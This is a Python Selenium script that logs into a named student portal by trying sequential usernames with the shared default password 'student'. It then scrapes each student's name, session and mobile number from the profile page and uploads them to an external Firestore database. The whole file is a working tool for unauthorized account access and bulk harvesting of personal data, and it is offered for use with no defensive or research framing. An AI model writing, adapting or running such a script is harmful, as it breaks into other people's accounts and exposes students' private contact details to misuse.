from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore

# Initialize Chrome WebDriver
driver = webdriver.Chrome()

main_url = "https://livestudent.deccansociety.org/"

# Initialize Firestore (replace with your own Firebase credentials JSON file)
cred = credentials.Certificate('serviceAccountKey.json')
firebase_admin.initialize_app(cred)
db = firestore.client()

# Function to perform login and retrieve name, session, and mobile number
def perform_login_and_get_details(username):
    try:
        # Open the website
        driver.get(main_url)

        # Wait for a few seconds for the page to load
        time.sleep(1)  # Adjust sleep time as needed

        # Find username and password fields and fill them
        username_field = driver.find_element(By.ID, "txtUserName")
        username_field.send_keys(username)

        password_field = driver.find_element(By.ID, "txtPassword")
        password_field.send_keys("student")

        # Click the login button
        login_button = driver.find_element(By.ID, "btnlogin")
        login_button.click()

        # Wait for a few seconds for the login process
        time.sleep(1)

        # Click on the specific link after logging in
        link = driver.find_element(By.LINK_TEXT, "Profile")
        link.click()

        # Wait until the info <div> is visible (assuming it appears after successful login)
        time.sleep(4)
        info_div = driver.find_element(By.CLASS_NAME, "pull-left.info")
        
        # Extract name and session details from the <h5> tags within the <div>
        h5_tags = info_div.find_elements(By.TAG_NAME, "h5")
        if len(h5_tags) >= 2:
            name = h5_tags[0].text.strip().replace("Hello, ", "")
            session = h5_tags[1].text.strip().replace("Session: ", "")
            try:
                mobile = driver.find_element(By.ID, "txtmobileNo").get_attribute("value")
            except:
                mobile = None
            print(f"Username: {username}")
            print(f"Name: {name}")
            print(f"Session: {session}")
            print(f"Mobile: {mobile}")
            return username, name, session, mobile
        else:
            print("Error: Expected <h5> tags not found.")
            return None, None, None, None

    except Exception as e:
        print(f"Error occurred for username {username}: {e}")
        return None, None, None, None

# Function to store data in Firestore
def store_data_in_firestore(username, name, session, mobile):
    try:
        # Define a Firestore document reference and set data
        doc_ref = db.collection('users').document(username)
        data = {
            'username': username,  # Store the username as a field
            'name': name,
            'session': session,
        }
        if mobile:
            data['mobile'] = mobile
        doc_ref.set(data)
        print(f"Data for {username} stored in Firestore successfully.")
    except Exception as e:
        print(f"Error storing data in Firestore for {username}: {e}")

# Generate a range of usernames and loop through them
start_username = 792600
end_username = 792900  # Adjust this range as needed for the number of usernames you want to try

for username_to_login in range(start_username, end_username + 1):
    username_str = str(username_to_login)
    username, name, session, mobile = perform_login_and_get_details(username_str)

    # If login is successful, store the data in Firestore
    if username and name and session:
        store_data_in_firestore(username, name, session, mobile)

# Close the browser session
driver.quit()
